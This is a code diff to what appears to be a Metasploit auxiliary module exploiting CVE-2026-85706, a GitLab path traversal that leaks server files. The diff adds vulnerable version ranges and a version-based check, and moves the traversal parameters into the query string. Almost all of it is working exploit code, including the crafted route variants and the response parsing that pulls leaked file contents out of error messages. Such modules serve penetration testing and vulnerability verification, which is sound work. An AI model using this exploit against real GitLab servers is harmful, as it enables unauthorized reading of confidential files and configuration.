@@ -4,7 +4,7 @@
 ##
 
 class MetasploitModule < Msf::Auxiliary
-  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HTTP::Gitlab
   include Msf::Auxiliary::Report
   prepend Msf::Exploit::Remote::AutoCheck
 
@@ -19,6 +19,11 @@ class MetasploitModule < Msf::Auxiliary
     { method: 'POST', path: '%72epository/commits' },
     { method: 'POST', path: 'repository/commits/' },
     { method: 'POST', path: 'repository/commits.json' }
+  ].freeze
+  VULNERABLE_VERSION_RANGES = [
+    [Rex::Version.new('18.7'), Rex::Version.new('19.1.8')].freeze,
+    [Rex::Version.new('19.2'), Rex::Version.new('19.2.6')].freeze,
+    [Rex::Version.new('19.3'), Rex::Version.new('19.3.2')].freeze
   ].freeze
 
   def initialize(info = {})
@@ -51,7 +56,8 @@ class MetasploitModule < Msf::Auxiliary
           ['CVE', '2026-85706'],
           ['URL', 'https://github.com/guneykabel/cve-2026-85706'],
           ['URL', 'https://docs.gitlab.com/releases/patches/patch-release-gitlab-19-3-2-released/'],
-          ['URL', 'https://gitlab.com/gitlab-org/gitlab/-/commit/0d9ce3e758a85f0690be751e213625f7902c0361']
+          ['URL', 'https://gitlab.com/gitlab-org/gitlab/-/commit/0d9ce3e758a85f0690be751e213625f7902c0361'],
+          ['URL', 'https://www.rapid7.com/blog/post/etr-cve-2026-85706-critical-gitlab-path-traversal-exploited-in-the-wild/']
         ],
         'DisclosureDate' => '2026-09-10',
         'License' => MSF_LICENSE,
@@ -73,20 +79,27 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
-    return Exploit::CheckCode::Unknown('GitLab was not detected') unless gitlab?
-
-    report_service(host: rhost, port: rport, proto: 'tcp', name: ssl ? 'https' : 'http', info: 'GitLab')
     result = read_file(CHECK_FILE)
     if result[:status] == :leaked && result[:content].include?('::Gitlab::Patch::DatabaseConfig')
       report_vuln(host: rhost, name: name, refs: references)
       return Exploit::CheckCode::Vulnerable('The target returned a GitLab application source file')
     end
 
-    if result[:status] == :unauthorized
-      return Exploit::CheckCode::Safe('GitLab rejected the unsigned upload metadata')
+    versions = gitlab_version
+    return Exploit::CheckCode::Unknown('GitLab was not detected') unless versions
+
+    low_version, high_version = versions.map { |version| normalize_gitlab_version(version) }
+    version_description = low_version == high_version ? low_version.to_s : "#{low_version} - #{high_version}"
+
+    if VULNERABLE_VERSION_RANGES.any? { |first, last| low_version >= first && high_version < last }
+      return Exploit::CheckCode::Appears("GitLab #{version_description} is vulnerable")
     end
 
-    Exploit::CheckCode::Detected("GitLab was detected, but the file read could not be verified (#{result[:status]})")
+    unless VULNERABLE_VERSION_RANGES.any? { |first, last| high_version >= first && low_version < last }
+      return Exploit::CheckCode::Safe("GitLab #{version_description} is not vulnerable")
+    end
+
+    Exploit::CheckCode::Detected("GitLab #{version_description} spans vulnerable and fixed versions; the file read could not be verified (#{result[:status]})")
   rescue StandardError => e
     Exploit::CheckCode::Unknown("#{e.class}: #{e.message}")
   end
@@ -117,16 +130,8 @@ class MetasploitModule < Msf::Auxiliary
 
   private
 
-  def gitlab?
-    res = send_request_cgi(
-      'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'users', 'sign_in')
-    )
-    return false unless res
-
-    res.body.include?('content="GitLab" property="og:site_name"') ||
-      res.body.include?('property="og:site_name" content="GitLab"') ||
-      res.headers.key?('X-GitLab-Meta')
+  def normalize_gitlab_version(version)
+    Rex::Version.new(version.to_s[/\d+\.\d+(?:\.\d+)*/])
   end
 
   def read_file(file_path)
@@ -140,11 +145,11 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_cgi(
         'method' => route[:method],
         'uri' => uri,
-        'ctype' => 'application/x-www-form-urlencoded',
-        'vars_post' => {
+        'vars_get' => {
           'file' => '',
           'file.path' => file_path,
-          'file.size' => '1'
+          'file.size' => '1',
+          'Content-Type' => 'application/x-www-form-urlencoded'
         }
       )
       next unless res
@@ -168,9 +173,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def classify_response(res)
     json = res.get_json_document
-    message = if json.is_a?(Hash)
-                json['error'] || json['message']
-              end
+    message = json&.fetch('error', nil) || json&.fetch('message', nil)
     message = message.to_s
 
     leak_start = message.index(LEAK_PREFIX)
@@ -178,11 +181,11 @@ class MetasploitModule < Msf::Auxiliary
       return { status: :leaked, content: message[(leak_start + LEAK_PREFIX.length)...-1] }
     end
 
-    return { status: :missing } if message.include?('local file not present')
-    return { status: :rewrite } if message.include?('Invalid json')
-    return { status: :partial } if message.include?('Invalid parameter type:')
-    return { status: :project_gate } if message.include?('404 Project Not Found')
-    return { status: :unauthorized } if res.code == 401
+    return { status: :missing } if message.include?('local file not present') # local file is not present
+    return { status: :rewrite } if message.include?('Invalid json') # request body was rewritten by Workhorse
+    return { status: :partial } if message.include?('Invalid parameter type:') # parser returned only a parameter fragment
+    return { status: :project_gate } if message.include?('404 Project Not Found') # project is not anonymously readable
+    return { status: :unauthorized } if res.code == 401 # endpoint enforced authentication
 
     if message.include?('branch is required') || message.include?('commit_message is required')
       return { status: :read_no_echo }
